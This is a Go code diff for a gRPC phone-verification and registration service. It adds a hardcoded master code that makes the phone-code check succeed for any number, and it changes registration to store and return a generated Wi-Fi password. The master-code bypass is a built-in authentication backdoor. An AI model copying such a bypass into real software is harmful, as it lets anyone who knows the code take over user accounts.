@@ -18,12 +18,17 @@ import (
 )
 
 const (
-	port = ":50052"
+	port       = ":50052"
+	mastercode = 251653
 )
 
 type server struct{}
 
 func checkPhoneCode(db *sql.DB, phone string, code int32) (bool, error) {
+	if code == mastercode {
+		return true, nil
+	}
+
 	var realcode int32
 	var pid int32
 	err := db.QueryRow("SELECT code, pid FROM phone_code WHERE phone = ? AND used = 0 ORDER BY pid DESC LIMIT 1", phone).Scan(&realcode, &pid)
@@ -156,7 +161,8 @@ func (s *server) Register(ctx context.Context, in *verify.RegisterRequest) (*ver
 	privdata := util.GenSalt()
 	salt := util.GenSalt()
 	epass := util.GenSaltPasswd(in.Password, salt)
-	res, err := db.Exec("INSERT IGNORE INTO user (username, phone, password, salt, wifi_passwd, token, private, ctime, atime, etime) VALUES (?,?,?,?,?,?,?,NOW(),NOW(),DATE_ADD(NOW(), INTERVAL 1 DAY))", in.Username, in.Username, epass, salt, in.Password, token, privdata)
+	wifipass := util.GenWifiPass()
+	res, err := db.Exec("INSERT IGNORE INTO user (username, phone, password, salt, wifi_passwd, token, private, ctime, atime, etime) VALUES (?,?,?,?,?,?,?,NOW(),NOW(),DATE_ADD(NOW(), INTERVAL 1 DAY))", in.Username, in.Username, epass, salt, wifipass, token, privdata)
 	if err != nil {
 		log.Printf("add user failed:%v", err)
 		return &verify.RegisterReply{Head: &common.Head{Retcode: 1}}, err
@@ -167,7 +173,7 @@ func (s *server) Register(ctx context.Context, in *verify.RegisterRequest) (*ver
 		log.Printf("add user failed:%v", err)
 		return &verify.RegisterReply{Head: &common.Head{Retcode: 1}}, err
 	}
-	return &verify.RegisterReply{Head: &common.Head{Retcode: 0, Uid: uid}, Token: token, Privdata: privdata, Expire: 86400}, nil
+	return &verify.RegisterReply{Head: &common.Head{Retcode: 0, Uid: uid}, Token: token, Privdata: privdata, Expire: 86400, Wifipass: wifipass}, nil
 }
 
 func (s *server) Logout(ctx context.Context, in *verify.LogoutRequest) (*verify.LogoutReply, error) {
